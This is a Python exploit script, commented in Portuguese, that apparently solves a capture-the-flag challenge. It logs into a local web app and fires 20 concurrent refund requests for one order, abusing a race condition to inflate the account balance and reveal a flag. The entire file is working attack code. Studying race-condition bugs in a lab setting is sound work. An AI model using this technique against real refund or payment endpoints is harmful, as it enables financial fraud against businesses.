#!/usr/bin/env python3
"""
Script de exemplo para explorar a race condition no endpoint /refund

Uso:
    python3 exploit_example.py http://localhost:8080 user user123
"""

import requests
import threading
import sys
import time

def request_refund(session, base_url, order_id, thread_id):
    """Faz requisição de reembolso"""
    try:
        response = session.post(
            f'{base_url}/refund',
            data={'order_id': order_id},
            timeout=10
        )
        result = response.json()
        print(f"[Thread {thread_id}] {result.get('message', result.get('error', 'Unknown'))}")
        if 'new_balance' in result:
            print(f"[Thread {thread_id}] New Balance: ${result['new_balance']:.2f}")
        return result
    except Exception as e:
        print(f"[Thread {thread_id}] Error: {e}")
        return None

def exploit_race_condition(base_url, username, password, order_id, num_threads=20):
    """Explora a race condition fazendo múltiplas requisições simultâneas"""
    
    # Criar sessão e fazer login
    session = requests.Session()
    
    print(f"[*] Fazendo login como {username}...")
    login_data = {'username': username, 'password': password}
    response = session.post(f'{base_url}/login', data=login_data, allow_redirects=False)
    
    if response.status_code != 302:
        print(f"[-] Login falhou! Status: {response.status_code}")
        return
    
    print("[+] Login bem-sucedido!")
    
    # Verificar saldo inicial
    response = session.get(f'{base_url}/home')
    print(f"[*] Página inicial carregada. Verifique o saldo atual.")
    
    # Disparar múltiplas requisições simultâneas
    print(f"\n[*] Disparando {num_threads} requisições simultâneas para o pedido {order_id}...")
    print("[*] Aguarde alguns segundos...\n")
    
    threads = []
    for i in range(num_threads):
        t = threading.Thread(
            target=request_refund,
            args=(session, base_url, order_id, i+1)
        )
        threads.append(t)
    
    # Iniciar todas as threads ao mesmo tempo
    start_time = time.time()
    for t in threads:
        t.start()
    
    # Aguardar todas as threads terminarem
    for t in threads:
        t.join()
    
    elapsed_time = time.time() - start_time
    print(f"\n[+] Todas as requisições completadas em {elapsed_time:.2f} segundos")
    
    # Verificar saldo final
    print("\n[*] Verificando saldo final...")
    response = session.get(f'{base_url}/home')
    if response.status_code == 200:
        print("[+] Verifique a página /home para ver seu saldo e a flag (se >= $10,000)")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Uso: python3 exploit_example.py <URL> <username> <password> [order_id] [num_threads]")
        print("\nExemplo:")
        print("  python3 exploit_example.py http://localhost:8080 user user123 1 20")
        sys.exit(1)
    
    base_url = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    order_id = int(sys.argv[4]) if len(sys.argv) > 4 else 1
    num_threads = int(sys.argv[5]) if len(sys.argv) > 5 else 20
    
    exploit_race_condition(base_url, username, password, order_id, num_threads)

